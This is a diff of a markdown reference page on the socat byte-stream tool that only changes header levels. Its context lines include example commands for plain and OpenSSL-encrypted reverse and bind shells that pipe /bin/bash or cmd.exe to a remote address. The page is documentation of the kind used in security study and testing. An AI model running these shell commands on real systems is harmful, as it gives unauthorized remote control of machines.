@@ -21,27 +21,27 @@ More capabilities, like daemon mode with forking, client address check, "tail -f
 
 In fact, many of these features already exist in specialized tools; but until now, there does not seem to exists another tool that provides such a generic, flexible, simple and almost comprehensive (UNIX) byte stream connector.
 
-### Installation
+## Installation
 
-#### Debian
+### Debian
 
 ```plain
 sudo apt install socat
 ```
 
-#### macOS
+### macOS
 
 ```plain
 brew install socat
 ```
 
-### Usage
+## Usage
 
 ```plain
 socat [options] <bi-address> <bi-address>
 ```
 
-### Flags
+## Flags
 
 ```plain
 options:
@@ -156,9 +156,9 @@ address-head:
     unix-sendto:<filename>    groups=FD,SOCKET,NAMED,RETRY,UNIX
 ```
 
-### Examples
+## Examples
 
-#### Basic client/server
+### Basic client/server
 
 **Server:**
 
@@ -176,7 +176,7 @@ sudo socat TCP4:<remote-server>:80 STDOUT
 sudo socat - TCP4:<remote-server>:80
 ```
 
-#### Send a file to receiver
+### Send a file to receiver
 
 **Sender:**
 
@@ -201,7 +201,7 @@ Hellothere!
 Summer2022!
 ```
 
-#### Reverse shell
+### Reverse shell
 
 **Server:**
 
@@ -221,7 +221,7 @@ socat -d -d TCP4-LISTEN:443 STDOUT
 socat TCP4:10.0.0.10:443 EXEC:/bin/bash
 ```
 
-#### Bind shell
+### Bind shell
 
 **Server:**
 
@@ -237,7 +237,7 @@ socat -d -d TCP4-LISTEN:443 EXEC:'cmd.exe',pipes
 socat - TCP4:<IP-of-SERVER>:443
 ```
 
-#### Encrypted bind shell
+### Encrypted bind shell
 
 To create a certificate, please check [OpenSSL]({{< ref "openssl" >}}).
 
@@ -253,7 +253,7 @@ sudo socat OPENSSL-LISTEN:443,cert=yourcert.pem,verify=0,fork EXEC:/bin/bash
 socat - OPENSSL:10.11.0.4:443,verify=0
 ```
 
-#### Encrypted reverse shell
+### Encrypted reverse shell
 
 **Server:**
 
@@ -271,7 +271,7 @@ Windows machine starting the connection to server routing `cmd.exe` in the shell
 socat -d -d OPENSSL:192.168.189.44:443,verify=0 EXEC:'cmd.exe',pipes
 ```
 
-### URL list
+## URL List
 
 * [Linux.die.net - socat](https://linux.die.net/man/1/socat)
 * [Formulae.brew.sh - socat](https://formulae.brew.sh/formula/socat)
